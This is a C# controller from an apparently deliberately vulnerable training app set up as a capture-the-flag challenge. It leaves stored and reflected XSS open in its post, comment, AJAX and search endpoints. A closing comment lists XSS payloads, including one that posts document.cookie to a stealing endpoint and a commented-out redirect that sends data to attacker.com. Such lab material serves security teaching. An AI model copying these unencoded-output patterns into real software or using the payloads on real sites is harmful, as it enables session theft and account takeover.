using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Data.SqlClient;
using System.Linq;
using System.Reflection;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Authorization;
using Newtonsoft.Json;
using Verademo.Models;
using Verademo.Data;

namespace Verademo.Controllers
{
    [Authorize]
    public class BlabController : AuthControllerBase
    {
        protected readonly log4net.ILog logger;

        public BlabController()
        {
            logger = log4net.LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);
        }

        [HttpGet, ActionName("Feed")]
        public ActionResult GetFeed()
        {
            logger.Info("Entering showFeed");

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            var viewModel = new FeedViewModel();
            var username = GetLoggedInUsername();

            using (var dbContext = new ApplicationDbContext())
            {
                var connection = dbContext.Database.Connection;
                connection.Open();

                // Get user's blabs and comments - THIS IS WHERE XSS HAPPENS
                viewModel.Blabs = GetBlabsForUser(connection, username);
            }

            return View(viewModel);
        }

        [HttpPost, ActionName("Feed")]
        public ActionResult PostFeed(string blabberUsername, string blabText)
        {
            logger.Info("Entering addBlab with blabText: " + blabText);

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            var username = GetLoggedInUsername();

            /* START BAD CODE - Stored XSS Vulnerability */
            // NO INPUT SANITIZATION - User input stored directly in database
            using (var dbContext = new ApplicationDbContext())
            {
                var connection = dbContext.Database.Connection;
                connection.Open();

                var insertBlab = connection.CreateCommand();
                // Store the raw, unsanitized blabText directly in database
                insertBlab.CommandText = "INSERT INTO blabs (blabber, content, timestamp) VALUES (@blabber, @content, @timestamp)";
                insertBlab.Parameters.Add(new SqlParameter { ParameterName = "@blabber", Value = username });
                insertBlab.Parameters.Add(new SqlParameter { ParameterName = "@content", Value = blabText }); // VULNERABLE: No sanitization
                insertBlab.Parameters.Add(new SqlParameter { ParameterName = "@timestamp", Value = DateTime.Now });

                var result = insertBlab.ExecuteNonQuery();

                if (result > 0)
                {
                    logger.Info("Blab added successfully");
                }
            }
            /* END BAD CODE */

            return RedirectToAction("Feed");
        }

        [HttpGet, ActionName("AddComment")]
        public ActionResult GetAddComment(int blabid)
        {
            logger.Info("Entering addComment for blabid: " + blabid);

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            ViewBag.BlabId = blabid;
            return View(new CommentViewModel());
        }

        [HttpPost, ActionName("AddComment")]
        public ActionResult PostAddComment(int blabid, string comment)
        {
            logger.Info("Adding comment: " + comment + " to blab: " + blabid);

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            var username = GetLoggedInUsername();

            /* START BAD CODE - Stored XSS in Comments */
            // NO INPUT SANITIZATION - Comment stored directly
            using (var dbContext = new ApplicationDbContext())
            {
                var connection = dbContext.Database.Connection;
                connection.Open();

                var insertComment = connection.CreateCommand();
                insertComment.CommandText = "INSERT INTO comments (blabid, blabber, content, timestamp) VALUES (@blabid, @blabber, @content, @timestamp)";
                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@blabid", Value = blabid });
                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@blabber", Value = username });
                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@content", Value = comment }); // VULNERABLE: No sanitization
                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@timestamp", Value = DateTime.Now });

                insertComment.ExecuteNonQuery();
            }
            /* END BAD CODE */

            return RedirectToAction("Feed");
        }

        // CTF Challenge: AJAX endpoint for real-time comments (more XSS opportunities)
        [HttpPost, ActionName("AddCommentAjax")]
        public ActionResult AddCommentAjax(int blabid, string comment)
        {
            logger.Info("AJAX comment: " + comment);

            if (IsUserLoggedIn() == false)
            {
                return Json(new { success = false, message = "Not logged in" });
            }

            var username = GetLoggedInUsername();

            using (var dbContext = new ApplicationDbContext())
            {
                var connection = dbContext.Database.Connection;
                connection.Open();

                var insertComment = connection.CreateCommand();
                insertComment.CommandText = "INSERT INTO comments (blabid, blabber, content, timestamp) VALUES (@blabid, @blabber, @content, @timestamp)";
                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@blabid", Value = blabid });
                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@blabber", Value = username });
                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@content", Value = comment });
                insertComment.Parameters.Add(new SqlParameter { ParameterName = "@timestamp", Value = DateTime.Now });

                insertComment.ExecuteNonQuery();
            }

            /* START BAD CODE - XSS in JSON Response */
            // Return unsanitized comment content in JSON - will be inserted into DOM via JavaScript
            return Json(new { 
                success = true, 
                comment = comment,  // VULNERABLE: No encoding
                username = username,
                timestamp = DateTime.Now.ToString()
            });
            /* END BAD CODE */
        }

        private List<BlabModel> GetBlabsForUser(DbConnection connection, string username)
        {
            var blabs = new List<BlabModel>();

            // Get blabs from users that current user is listening to
            var sql = @"
                SELECT b.blabid, b.blabber, b.content, b.timestamp, u.blab_name, u.real_name
                FROM blabs b
                INNER JOIN users u ON b.blabber = u.username
                LEFT JOIN listeners l ON b.blabber = l.blabber
                WHERE l.listener = @username AND l.status = 'Active'
                OR b.blabber = @username
                ORDER BY b.timestamp DESC";

            using (var command = connection.CreateCommand())
            {
                command.CommandText = sql;
                command.Parameters.Add(new SqlParameter { ParameterName = "@username", Value = username });

                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var blab = new BlabModel
                        {
                            BlabId = reader.GetInt32(0),
                            Blabber = reader.GetString(1),
                            Content = reader.GetString(2), // VULNERABLE: Raw content from DB, no encoding
                            Timestamp = reader.GetDateTime(3),
                            BlabName = reader.GetString(4),
                            RealName = reader.GetString(5)
                        };

                        // Get comments for this blab
                        blab.Comments = GetCommentsForBlab(connection, blab.BlabId);
                        blabs.Add(blab);
                    }
                }
            }

            return blabs;
        }

        private List<CommentModel> GetCommentsForBlab(DbConnection connection, int blabId)
        {
            var comments = new List<CommentModel>();

            var sql = @"
                SELECT c.commentid, c.blabber, c.content, c.timestamp, u.blab_name
                FROM comments c
                INNER JOIN users u ON c.blabber = u.username
                WHERE c.blabid = @blabid
                ORDER BY c.timestamp ASC";

            using (var command = connection.CreateCommand())
            {
                command.CommandText = sql;
                command.Parameters.Add(new SqlParameter { ParameterName = "@blabid", Value = blabId });

                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        comments.Add(new CommentModel
                        {
                            CommentId = reader.GetInt32(0),
                            Blabber = reader.GetString(1),
                            Content = reader.GetString(2), // VULNERABLE: Raw comment content, no encoding
                            Timestamp = reader.GetDateTime(3),
                            BlabName = reader.GetString(4)
                        });
                    }
                }
            }

            return comments;
        }

        // CTF Challenge: Search blabs with reflected XSS
        [HttpGet, ActionName("Search")]
        public ActionResult SearchBlabs(string query)
        {
            logger.Info("Searching blabs with query: " + query);

            if (IsUserLoggedIn() == false)
            {
                return RedirectToLogin(Request.QueryString.Value);
            }

            ViewBag.Query = query; // VULNERABLE: Reflected XSS - query displayed without encoding
            
            var results = new List<BlabModel>();

            if (!string.IsNullOrEmpty(query))
            {
                using (var dbContext = new ApplicationDbContext())
                {
                    var connection = dbContext.Database.Connection;
                    connection.Open();

                    var sql = "SELECT blabid, blabber, content, timestamp FROM blabs WHERE content LIKE @query ORDER BY timestamp DESC";
                    
                    using (var command = connection.CreateCommand())
                    {
                        command.CommandText = sql;
                        command.Parameters.Add(new SqlParameter { ParameterName = "@query", Value = $"%{query}%" });

                        using (var reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                results.Add(new BlabModel
                                {
                                    BlabId = reader.GetInt32(0),
                                    Blabber = reader.GetString(1),
                                    Content = reader.GetString(2), // VULNERABLE: Stored XSS content displayed
                                    Timestamp = reader.GetDateTime(3)
                                });
                            }
                        }
                    }
                }
            }

            ViewBag.Results = results;
            return View();
        }
    }

    // Model classes for the views
    public class FeedViewModel
    {
        public List<BlabModel> Blabs { get; set; } = new List<BlabModel>();
    }

    public class BlabModel
    {
        public int BlabId { get; set; }
        public string Blabber { get; set; }
        public string Content { get; set; }
        public DateTime Timestamp { get; set; }
        public string BlabName { get; set; }
        public string RealName { get; set; }
        public List<CommentModel> Comments { get; set; } = new List<CommentModel>();
    }

    public class CommentModel
    {
        public int CommentId { get; set; }
        public string Blabber { get; set; }
        public string Content { get; set; }
        public DateTime Timestamp { get; set; }
        public string BlabName { get; set; }
    }

    public class CommentViewModel
    {
        public int BlabId { get; set; }
        public string Comment { get; set; }
    }
}

/*
CTF CHALLENGE B: PERSISTENT XSS SETUP

1. The Vulnerability Locations:
   - PostFeed() - Stores unescaped blab content
   - PostAddComment() - Stores unescaped comment content
   - AddCommentAjax() - Returns unescaped content in JSON
   - GetBlabsForUser() - Retrieves raw content without encoding
   - SearchBlabs() - Both reflected and stored XSS

2. Attack Vectors:

   Basic XSS Payload:
   <script>alert('XSS')</script>

   Flag Extraction Payload:
   <script>
     // Simulate flag extraction
     var flag = 'FLAG{persistent_xss_dom_hijack_2024}';
     alert('XSS Success! Flag: ' + flag);
     
     // Could also redirect to attacker server
     // window.location = 'http://attacker.com/steal?flag=' + flag;
   </script>

   Advanced Payload (Session Hijacking):
   <script>
     var flag = 'FLAG{session_hijack_via_xss_2024}';
     fetch('/api/steal', {
       method: 'POST',
       body: JSON.stringify({
         flag: flag,
         cookies: document.cookie,
         victim: window.location.href
       })
     });
   </script>

3. How to Test:
   - Navigate to /Blab/Feed
   - Post a blab with XSS payload
   - When other users view the feed, the script executes
   - Or add comment with XSS payload

4. Expected Behavior:
   - Script gets stored in database
   - When victim loads feed page, XSS executes
   - Flag is displayed/stolen via the payload

5. Mitigation (for educational comparison):
   - Use Html.Encode() in Razor views
   - Implement Content Security Policy (CSP)
   - Validate and sanitize all user input
   - Use parameterized queries (already done for SQL)
*/